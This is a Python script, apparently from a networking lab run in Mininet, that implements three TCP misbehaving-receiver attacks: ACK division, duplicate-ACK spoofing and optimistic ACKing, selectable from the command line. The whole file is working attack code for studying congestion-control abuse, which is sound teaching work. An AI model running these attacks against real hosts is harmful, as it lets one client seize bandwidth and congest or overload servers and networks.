from naive_tcp import *
import time

class ACK_Division_Attacker(TCP_Client):
    def __init__(self, num, host, **kwargs):
        TCP_Client.__init__(self, 'receiver', host, **kwargs)
        self.num_division = num
    
    def post_receive(self, pkt, status):
        if pkt[scp.TCP].seq == 1:
            new_seq = pkt[scp.TCP].seq
            payload_len = len(pkt[scp.TCP].payload)
            for i in xrange(self.num_division):
                ack_no = new_seq + i * (payload_len / self.num_division) + 1
                self.send_ack(ack_no)
        else:
            TCP_Client.post_receive(self, pkt, status)

class DupACK_Spoofing_Attacker(TCP_Client):
    def __init__(self, num, host, **kwargs):
        TCP_Client.__init__(self, 'receiver', host, **kwargs)
        self.num_dupacks = num

    def post_receive(self, pkt, status):
        if pkt[scp.TCP].seq == 1:
            for _ in xrange(self.num_dupacks):
                self.send_ack(self.ack)
        else:
            TCP_Client.post_receive(self, pkt, status)

class Optimistic_ACKing_Attacker(TCP_Client):
    def __init__(self, num, interval, host, **kwargs):
        TCP_Client.__init__(self, 'receiver', host, **kwargs)
        self.num_optacks = num
        self.ack_interval = interval
    
    def post_receive(self, pkt, status):
        cur_ack_no = 1
        if pkt[scp.TCP].seq == 1:
            for _ in xrange(self.num_optacks):
                cur_ack_no += MSS
                self.send_ack(cur_ack_no)
                time.sleep(self.ack_interval / 1000.)
        else:
            TCP_Client.post_receive(self, pkt, status)


def check_attack_type(val):
    if val not in ['div', 'dup', 'opt']:
        raise argparse.ArgumentTypeError("%s is an invalid attack name." % val)
    return val

def parse_args():
    parser = argparse.ArgumentParser(description= \
            "TCP malicious receiver (attack implementations).")
    parser.add_argument('--host', dest='host', 
                        required=True, help="Mininet host (`h1` or `h2`)")    
    parser.add_argument('--attack', dest='attack', required=True,
        type=check_attack_type,
        help="The receiver attack to implement (`div`, `dup`, or `opt`).")

    parser.add_argument('--num', dest='num', required=True, type=int,
        help="The number of spoofed ACKs the attacker sends on receiving the \
                first data segment")
    parser.add_argument('--interval', dest='interval', type=int,
        help="Time interval between sending optimistic ACKs (in milliseconds).")
    parser.add_argument("--verbose", dest='verbose', type=check_bool, nargs='?', const=True,
        help="Verbose flag for TCP communication log.")

    args = parser.parse_args()
    if args.attack == 'opt' and args.interval is None:
        parser.error('Optimistic ACKing attack requires --interval.')

    return parser.parse_args()

if __name__ == "__main__":
    args = parse_args()

    kwargs = {'verbose': args.verbose}
    if args.attack == 'div':
        attacker = ACK_Division_Attacker(args.num, args.host, **kwargs)
    if args.attack == 'dup':
        attacker = DupACK_Spoofing_Attacker(args.num, args.host, **kwargs)
    if args.attack == 'opt':
        attacker = Optimistic_ACKing_Attacker(args.num, args.interval, args.host, **kwargs) 
    
    attacker.start()
